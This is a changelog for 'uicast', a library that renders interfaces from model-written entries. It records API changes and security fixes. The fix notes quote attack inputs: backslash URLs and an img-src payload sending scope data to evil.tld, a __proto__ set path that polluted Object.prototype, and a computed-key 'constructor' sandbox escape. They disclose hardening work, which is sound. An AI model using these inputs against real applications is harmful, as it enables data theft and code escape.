# Changelog

All notable changes to this package will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added

- A JSDoc comment with an example on every public export, `@uicast/core/prompt` included, shown on hover.
- `getComponentsPartialPrompt({ urlPolicy })`: with a URL prop listed, a `## URL Props` section says which URLs the renderer loads, from the same policy (its defaults when omitted). A predicate prints nothing; describe it in `note`.
- **`budget-exceeded` reason.** An expression that ran past its step, time or allocation budget was reported as `guardrail-violation`; it has its own reason now, fault `document`.
- **`invalid-entry` reason**, fault `document`: a field of the line has the wrong type — a `seed` that is not an array of steps, a callback that is not one, `hidden` written as `{ "expr": … }`, a list without `as`. `entryShapeError` in `@uicast/core/internal` checks every field but `key` and `component` and names the wrong one. `isComponentEntry` still checks only what the element table needs, so such a line reaches the renderer and is classified there.

### Changed

- The components and functions blocks each have one `#` heading, `# Available Components` and `# Available Functions`. Their other sections are `##`: `## Component Details`, `## Common Events`, `## Function Details`, `## Shared Types`, `## URL Props`.
- The recovery prompt describes `invalid-list` as "`each` didn't evaluate to an array, or `as` names a scope that already exists": the React binding now reports a list whose `as` repeats a scope around it.
- The prompt says **entry** for a line the model writes, **element** for what mounts from it, and **step** for one item of a `seed` or a callback. The recovery message starts each line with ``Entry `<key>`:``, and the scope hint reads "around N entries (JSONL lines)".
- The prompt says a seed only reads: a function that changes data (create, update, delete) goes in a callback, since a seed runs every time its element mounts.
- **`EntryErrorReason` includes the evaluator's `ExpressionErrorReason`.** A reason from `@uicast/expr` passes through unchanged; nothing maps one onto the other.
- `@uicast/core/internal` drops `depKey`, `findSetAddressFault`, `SetAddressFault`, `checkUrl`, `UrlCheck`, `UrlViolation` and `ForwardTarget`; nothing outside core used them. `findEntrySetAddressFault` and `setAddressError` are one call, `entrySetAddressError(entry)`, which returns the first bad `set` as its error.
- No runtime dependencies: the Standard Schema and `StandardToolV0` types come from `@uicast/expr`, the peer dependency, instead of `@standard-schema/spec` and `standard-tool`.
- `$$emitter.on` handlers take no argument; nothing read the `{ field, value, oldValue }` payload.
- `ReactiveProxy` defaults to `Record<string, unknown>`, so `scopes.root.x` reads and writes type-check in `init` without a cast.
- `extractDeps` requires its `part` argument.

- **Breaking: a scope's `$set` and `$emitter` are `$$set` and `$$emitter`.**
- **Breaking (types): `$$emitter` is typed as `{ on }`.** `emit` and `version` were the renderer's own and are no longer public.
- **Breaking: the public entry is only what a host writes against.** `checkUrl`, `findUrlViolations`, `schemaHasUrlFormat`, `UrlCheck`, `UrlViolation`, `isComponentListEntry` and `CALLBACK_DEBOUNCE_MS` moved to `@uicast/core/internal`. `UrlPolicy` stays public — a host declares it. The index is the document format, the definition factory, the scope and stream helpers, and `EntryError`.
- **Breaking: `getScopePartialPrompt`'s `approxElements` is `approxEntries`,** the word the prompt uses for a line.
- **A scope is one shallow proxy; a `set` names one field.** `createProxyScope` no longer wraps nested objects: everything under a field is plain data, a write replaces the field and emits it, and `$$set(field, value)` takes a field, not a path. Subscriptions are per field — a write to `scopes.root.user` wakes a reader of `scopes.root.user.name` — so `extractDeps` returns `scopes.<scope>.<field>` keys and `planStepWaves` compares them. The `set` address grammar is `scopes.<scope>.<field>`, checked by `parseSetAddress` / `findEntrySetAddressFault` (replacing `validate-set-path`); anything deeper, a number, a missing `scopes.` prefix, a prototype name or one of the runtime's row fields is a `guardrail-violation` at mount.
- **Row scopes are windows onto array elements.** `createRowScope` (internal) reads the element's own fields and nothing else. `createRowState` (internal) is the row's `$<as>` scope: read-only `index`, `id` and `value`, then whatever the row's steps set. A write never changes the element: it puts an edited copy into the fields its list's `each` reads, found there by identity, and writes those fields. A field of an outer row is that row's write, so a nested edit climbs to the outermost array. A row whose element is in none of them (`each` built new objects, or the row was removed) refuses the write as `unknown-reference`. An expression that returns a whole row scope (`({ record: scopes.row })`) returns the element, not a live view. `childScopes` is gone.
- The prompt's host-call examples pass the data field (`scopes.row.id`). A row's own UI state goes in `scopes.$row`; state read outside the row goes in a root map keyed by `scopes.$row.id`, the `keyBy` value or the index without `keyBy`.
- A `set` of `scopes.$<as>.index`, `.id` or `.value` is refused at mount, and a list whose `as` starts with `$` fails as `invalid-entry`.
- **A whole-scope read subscribes to every field of it.** `extractDeps` returns `scopes.<scope>.*` for `Object.keys(scopes.root)` or a bare `scopes.row`, where it returned nothing, and `planStepWaves` makes such a read wait for any write into that scope.
- A row held in an object of arrays (`scopes.root.byCustomer[id]`) can be written: a scope field holds an element one level down through an object's array values too.
- **The prompt prints a schema's constraints.** `integer`, bounds, `multipleOf`, lengths, `format` (or `pattern` without one), item counts, `uniqueItems` and `default` follow the description in the field's comment (`limit?: number /* Rows to return. integer, ≥ 1, ≤ 200, default 50 */`), so a model calls a function within its validators instead of learning them from validation errors. The `±MAX_SAFE_INTEGER` bounds a bare `.int()` stamps are not printed. A component prop still prints its own default as ` = value` after the type.
- The prompt tells the model to use a function's window, sort and filters when it offers them and to read returned aggregates instead of reducing over rows (§9); §6 pages through the function's own window before slicing a seeded array. A fetched window may be filtered or sorted locally only when it holds every matching row. A callback step's target keeps its old value until a call resolves; the prompt shows the placeholder-then-call pattern for loading states.

- **`ConfirmableValueSourceAssignment` is `CallbackValueSourceAssignment`.** Same shape, plus `debounce`.
- **The host provides the evaluator.** `evaluate(expr, context, evaluator)` takes an `ExpressionEvaluator` — the interface from `@uicast/expr` that `Evaluator` implements, re-exported here. An evaluator of your own can implement it too, for any language. The `functions` / `evaluator: "native"` / `maxExpressionLength` options are gone; core constructs no evaluator and imports nothing from `@uicast/expr` at run time (an `ExpressionError` is recognized by its brand). Its host-function name screen now refuses only uicast's own names (`scopes`, `evt`, `currentValue`); identifier validity is the evaluator's check and the globals collision the prompt builder's. `extractDeps(entry, evaluator, part?)` and `planStepWaves(steps, evaluator, …)` take the same instance, so analysis and evaluation share one parse cache and one `maxSourceLength`; the earlier mismatch between the two caps is gone by construction. `getFreeIdentifiers` and `EvaluatorMode` are removed from `@uicast/core/internal`.
- **uicast**'s own host-function name screen (`scopes`, `evt`, `currentValue`, the globals) runs once per evaluator instance, on `evaluator.functions`; identifier validity is the evaluator's own check, at construction.
- **A `set` path without the `scopes.` prefix was invisible to wave planning** — reads come back prefixed, writes were compared as written, and a reader could land in the same wave as its writer. Both sides are normalised.
- Tool names are screened against the array's contents right before they are bound, not once per array identity — an array mutated after first use no longer binds unscreened. Identifier validity and duplicates are the evaluator's own checks now; core keeps only the `scopes` / `evt` / `currentValue` and global-collision rules.
- The recovery prompt's description of a `guardrail-violation` names the budget, so a step, time, or allocation refusal is no longer described to the model as a syntax error.
- **The expressions prompt gives rules, not a method list.** The language is the standard methods of strings, numbers and arrays, minus what the rules leave out: mutation, iterators, `forEach`, regular expressions. A few idioms show the common shapes. An arrow is written only as a method's callback. There is no `new`, so every value is JSON, and a date is an ISO string or a timestamp. §9 says a host function call is the expression's result — the whole of it, a branch of `?:`, or the right side of `??`, `||`, `&&`: the model reads its result in a later step, and fetches many ids through one call.
- **The determinism rule is uicast's, not the language's.** A reactive expression gives the same result for the same state. A time computed in a prop is as fresh as its last re-evaluation; a moment to keep is written by a step.
- A function's call signature no longer wraps an intersection or union input in a second pair of parentheses: `listOrders(Window & { … })`, not `listOrders((Window & { … }))`.
- Compiled to ES2022.

### Fixed

- **A recursive type given a new description keeps its id in the prompt.** For `node.meta({ description })` on a `z.lazy(…).meta({ id: "Node" })` schema, zod 4.4+ emits `Node` as a bare `$ref` to a generated definition, and the prompt printed the generated name (`__schema0`). A definition that only points at another one now prints as one type under its own name when nothing else uses the target.
- **A URL prop could load from any host through backslashes.** `\\evil.tld/x`, `/\evil.tld/x` and `\/evil.tld/x` passed the URL policy as relative, but the browser's URL parser reads `\` as `/` and fetched them from `evil.tld`: a document could send scope data to any host on render. A value with no scheme that starts with two slashes or backslashes, in any mix and with tabs or newlines between them, names a host, as it does for the browser; that host is now checked like any absolute URL. An explicit `origin` written with a trailing slash now matches its origin.
- **Some declared URL props were never checked.** `findUrlViolations` stopped at a fixed depth and passed everything below it, so an `OrgChart` avatar six levels down loaded from any host. It followed one `$ref` hop and never a root self-reference (`#`, which a top-level `z.lazy` emits), and skipped tuples (`prefixItems`) and records (`additionalProperties`, `patternProperties`, keys under `propertyNames`). `schemaHasUrlFormat` stopped at depth 12, so a component whose URL props all sat deeper skipped the check. Both now follow every `$ref` chain and every applicator but `not`, with no depth limit; each value is walked once per schema node, so recursive schemas and cyclic values end.
- **Breaking:** `buildElementsByKey` returns an object with no prototype. Its keys are model-written: an entry keyed `__proto__` replaced the map's prototype and never rendered, and a child named `toString` resolved to `Object.prototype.toString`. Use `Object.hasOwn(map, key)`, not `map.hasOwnProperty(key)`.
- **A seed or callback step that does not parse fails classified.** `planStepWaves` let a raw `ExpressionError` through, which the React binding filed as `implementation` (a seed) or `unknown` (a callback). It is an `EntryError` with the evaluator's reason now (`expression-syntax` for a step that does not parse), fault `document`, so the repair loop sees it.
- `planStepWaves` finds `currentValue` in the parse, not in the text: an escaped spelling now waits for the earlier write, and a string or property named `currentValue` no longer splits a wave.
- **A component whose props are not one object showed the model no props.** A union, an intersection (`.and()`) or a record printed no `Props:`; it prints as one type now (`Props: { kind: "circle"; radius: number } | { kind: "square"; side: number }`), and a root `$ref` lists the fields of the object it names.
- `getComponentsPartialPrompt` with no visible definition and `getFunctionsPartialPrompt` with no function printed their headings over nothing. They print only the `note`, if there is one.
- `createComponentDefinition` refuses a `children` field in every branch of union or intersection props and payloads, not only in a plain object.
- A prop type with a root self-reference (`$ref: "#"`) prints the root's fields one level down in the prompt, instead of `unknown`.

### Added

- **`loading` on an entry.** A bare expression like `hidden`: while truthy the element renders as busy. Reactive (`extractDeps` subscribes to it), passed to the implementation by the React binding. The prompt teaches the flag-around-the-fetch pattern (§8).
- **`debounce` on a callback step.** `{ "debounce": true }` makes that step and every step after it wait 300 ms of quiet, running once with the latest `evt`; the steps before it run at once. The prompt teaches it for search-as-you-type (§7).
- **`getExpressionsPartialPrompt()` moves here** from `@uicast/expr/prompt`, so every partial but the Streamdown fence comes from one import. The globals and length slots still fill from `@uicast/expr`'s own constants, and a new test fails if the markdown advertises a method the grammar would refuse — the drift this file's location exists to prevent.

### Changed

- **Host functions are bound by `@uicast/expr` now.** The tools array selects a cached evaluator instead of being wrapped per call, so `wrapTools` and its WeakMap are gone. The evaluator validates each call's input and output against the tool's own schemas, which replaces the structural sniff for `StandardToolValidationError` — an input rejection is `invalid-arguments` (document fault) because it names a real declared schema, not because of an error's name. A host function that throws its own `EntryError` still reaches `onError` unchanged.
- The expression-reason mapping is a total table rather than a ternary chain, so a reason added in `@uicast/expr` fails this build instead of arriving unmapped.


### Changed

- **`getExpressionsPartialPrompt` moved to `@uicast/expr`.** The syntax, method list, and globals now live next to the grammar and membrane that enforce them — a contract in a different package from the thing it describes drifts silently, which is exactly what happened before (the old file still advertised block-bodied arrows after the grammar had removed them). What was uicast's own in that block — `scopes`, `evt`, `currentValue`, the host-function calling rule — is now the `# Expression Context` section of `INSTRUCTIONS.md`, so `getCommonInstructionsPartialPrompt()` carries it and no separate builder exists. Assemble the language partial from its new home:

  ```ts
  getCommonInstructionsPartialPrompt(), // @uicast/core/prompt — contract + expression context
  getExpressionsPartialPrompt(),        // @uicast/expr/prompt — the language
  ```

- **Every `get*PartialPrompt` builder takes `note?`** — host-specific context rendered as that section's trailing `## Note`, verbatim. It replaces `extraScopes`: declare an injected scope via `getCommonInstructionsPartialPrompt({ note })`, which lands right under `# Expression Context`.

- **The expression evaluator moved to `@uicast/expr`, and no longer uses `new Function`.** Expressions are parsed once, checked against a closed AST allow-list, and compiled to a tree of closures; every property read and every call passes a runtime membrane, and every iteration a step/time/allocation budget. This closes the computed-key escape class (`obj["con"+"structor"]`) that a static pass could not, and removes the CSP `unsafe-eval` requirement — uicast now runs under a strict Content-Security-Policy. `core/src/expr/{safer-eval,validate,analyze,globals,ast-utils}.ts` are gone; `evaluate.ts` keeps host-function binding and `EntryError` classification.
- **The expression grammar is narrower.** No statements (so no `while`/`for`/`try`), no declarations or `function` keyword (so nothing can recurse), no assignment, no regular expressions, and a callback body must be a single expression — `items.map(x => x.name)`, not `items.map(x => { return x.name })`. `EXPRESSIONS.md` and its JSON mirror are updated to match; every expression in the shipped demo documents validates unchanged.
- The grammar drops `in`, the bitwise operators, and optional *calls* (`x?.()`); `.sort()` / `.reverse()` return a new array instead of mutating. The `evaluator` prop on `RendererProvider` selects the back end (`"interpret"` default, or `"native"` for trusted-author documents); the dead `allowGlobals` prop is removed.
- **The expression language is smaller still.** `await` is rejected (the runtime awaits host results; the prompt already said never to write it); `.sort()` / `.reverse()` are replaced by the standard non-mutating `.toSorted()` / `.toReversed()`, so immutability is structural in both back ends and the last deliberate divergence from plain JavaScript is gone; a dozen formatting methods nothing used are cut, and written method calls are now checked by the shared validator so `interpret` and `native` refuse identical sets.
- `acorn` is no longer a dependency of core — all parsing lives in `@uicast/expr`.
- `@uicast/expr` is a **peer dependency** of core, not a regular one: hosts import its prompt partial directly (`getExpressionsPartialPrompt`), and a single shared copy keeps the evaluator, the prompt, and `instanceof ExpressionError` checks on one instance.
- `evaluate` takes `maxExpressionLength` (default 1000), threaded from the renderer; an oversized expression is rejected before parsing as a classified document fault.
- **The prompt bounds list size.** A new rule in `INSTRUCTIONS.md` §6: never render an unbounded array — cap the visible slice, page through state, and reach the rest with search or a filter. The cap is `maxListItems` on `getCommonInstructionsPartialPrompt` (default 100). Rendering thousands of rows stalls the browser at paint, which no expression budget can prevent.
- **One host-function-name screen at both seams.** `evaluate` and `getFunctionsPartialPrompt` now share a rule built on `@uicast/expr/internal`'s `isUsableName`, plus uicast's own reserved names. Each previously had half the check: the prompt builder advertised names no expression can call (`foo-bar`), and `evaluate` accepted names that silently shadow `scopes` / `evt` / `currentValue` or an expression global such as `Math`. All four cases now fail fast with a host-blamed error.

### Fixed

- **Prototype pollution through a step's `set` path.** `{"set": "scopes.root.__proto__.x"}` walked out of the scope object and wrote to the host application's `Object.prototype`. Prototype-reaching segments (`__proto__`, `constructor`, `prototype`, the `__define*__`/`__lookup*__` pairs) are now rejected statically by `findSetPathFault` and again at the sink in `createProxyScope.set()`.

### Added

- `UrlPolicy`, `checkUrl`, and `findUrlViolations`: props a component definition declares as URLs (JSON Schema `format: "uri"` / `"uri-reference"`) are validated before the implementation sees them. Relative, same-origin, and raster `data:` images by default; `image/svg+xml` is excluded because SVG can carry script. Without this, a document could put `"https://evil.tld/?d=" + JSON.stringify(scopes.root.rows)` into an `<img src>` and the browser would send it on render — an exfiltration channel needing no evaluator escape.
- Initial public beta of the framework-agnostic uicast engine: entry format, JavaScript expressions evaluated by `@uicast/expr`, reactive scopes, and the prompt partial builders (`@uicast/core/prompt`). Binding plumbing lives in `@uicast/core/internal`, which carries no semver guarantee.
